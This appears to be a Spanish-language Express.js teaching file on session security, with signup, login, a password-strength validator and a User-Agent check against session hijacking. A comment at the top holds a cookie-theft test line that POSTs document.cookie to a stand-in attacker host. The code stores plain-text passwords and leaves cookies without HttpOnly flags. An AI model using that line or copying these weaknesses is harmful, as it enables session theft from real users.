//npm init -y
//npm i express
//npm i -D nodemon
//npm run dev
// npm i cookie-parser



//prueba en navegador
//alert(docuemnt.cookie);
//fetch('https://atackers.site/cookies/robbed',{method:'POST',body:docuemnt.cookie})

const express = require("express");
const crypto = require("crypto");
const cookieParser = require("cookie-parser");
const { CLIENT_RENEG_LIMIT } = require("tls");
const app = express();
const PORT = 3000;

const users = [];
const sessions = {};

const isValidPassword = function(password){
    // Longitud minima de 10 caracteres
    if(password.length < 10){
        return false;
    }
    // Contenga al menos una mayuscula
    if(!/[A-Z]/.test(password)){
        return false;
    }
    // Contener al menos una minuscula
    if(!/[a-z]/.test(password)){
        return false;
    }
    // Contener al menos un numero
    if(!/[0-9]/.test(password)){
        return false;
    }
    // Contener al menos un caracter especial
    if(!/[^A-Za-z0-9]/.test(password)){
        return false;
    }
    // Que un caracter no se repita mas de 3 veces consecutivas
    if(/(.)\1{3,}/.test(password)){
        return false;
    }
    return true;

};

const createSession = function(req, res){
    const userAgent = req.get('user-agent');
    const sessionId = crypto.randomBytes(16).toString('base64url');
    sessions[sessionId] = {userAgent};
    res.cookie("sessionId", sessionId);
    return sessionId;
};

const getSessionId = function(req, res){
    return req.cookies['sessionId'] || createSession(req, res);
};

const getSessionData = function(req, res){
    let sessionId = req.cookies['sessionId'] || undefined;
    if(!sessionId){
        sessionId = createSession(req, res);
    }
    let sessionData = sessions[sessionId] || undefined;
    if(!sessionData){
        sessionId = createSession(req, res);
        sessionData = sessions[sessionId];
    }
    return sessionData;
};
const sessionsMiddleware = function(req, res, next){
    const sessionData = getSessionData(req, res);

    if(!sessionData || !sessionData.username){
        res.redirect(302, '/login');
        return;
    }

    req.userData = sessionData;
    next();
};

const sessionHijackCheckMiddleware = function(req, res, next){
    const sessionData = getSessionData(req, res);
    const requestUserAgent = req.get('user-agent');
    const sessionUserAgent = sessionData.userAgent || null;
    if(requestUserAgent != sessionUserAgent){
        const sessionId = getSessionId(req, res);
        delete sessions[sessionId];
        console.log('SESSION SECUESTRADA, detectado por User-Agent.');
        createSession(req, res);
    }
    next();
};

app.use(cookieParser());
app.use(express.urlencoded({extended:true}));
app.get("/", (req,res) => {
    res.send("Hola mundo");
});

app.post('/login', (req,res) => {
    console.log(req.body);
    let {username, password} = req.body;

    if(username.trim() == "" || password == ""){
        res.send('Datos de acceso incorrectos.');
        return;
    }
    username = username.toLowerCase();
    const user = users.find(u => u.username == username);

    if(!user){
        res.send('Datos de acceso incorrectos.');
        return;
    }
    if(user.password != password){
        res.send('Datos de acceso incorrectos.')
        return;
    }

    
    const sessionId = createSession(req, res);
    sessions[sessionId]['username'] = username;
    res.redirect(302, '/home');
});
app.get('/home', sessionHijackCheckMiddleware, sessionsMiddleware, (req, res)=>{
    res.send(`Hola ${req.userData.username}`);
})
app.post('/signup', (req,res)=>{
    let {username, password, password2} = req.body;
    
    if(password != password2){
        res.send('Las contraseñas no coinciden');
        return;
    }
    if(!isValidPassword(password)){
        res.send('Las contraseña no cumple con caracteristicas de seguridad');
        return;
    }
    username = username.toLowerCase();
    const user = users.find(u => u.username == username);
    if(user){
        res.send("Nombre de usuario ya esta en uso");
        return;
    }
    users.push({username, password});
    res.redirect('/login');
});

app.use('/signup', express.static("static/html/signup.html"));

app.use(express.static('static'));
app.use('/login', express.static("static/html/login.html"));


app.listen(PORT, () =>{
    console.log(`Listening on http://127.0.0.1:${PORT}`);

})